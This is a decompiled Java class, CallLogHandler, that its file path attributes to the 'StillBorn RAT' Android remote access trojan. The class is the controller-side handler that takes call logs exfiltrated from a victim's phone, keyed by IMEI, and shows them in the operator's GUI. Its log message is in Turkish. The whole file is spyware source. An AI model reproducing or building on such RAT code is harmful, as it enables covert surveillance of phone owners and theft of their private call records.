/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.CallLogPacket;
/*  4:   */ import Packet.Packet;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class CallLogHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public CallLogHandler(int chan, String imei, GUI gui)
/* 17:   */   {
/* 18:35 */     this.channel = chan;
/* 19:36 */     this.imei = imei;
/* 20:37 */     this.gui = gui;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void receive(Packet p, String imei) {}
/* 24:   */   
/* 25:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 26:   */   {
/* 27:47 */     this.gui.logTxt("Arama bilgisi alındı");
/* 28:48 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/* 29:49 */     CallLogPacket packet = (CallLogPacket)p;
/* 30:50 */     this.gui.updateUserCallLogs(this.imei, packet.getList());
/* 31:   */   }
/* 32:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.CallLogHandler
 * JD-Core Version:    0.7.0.1
 */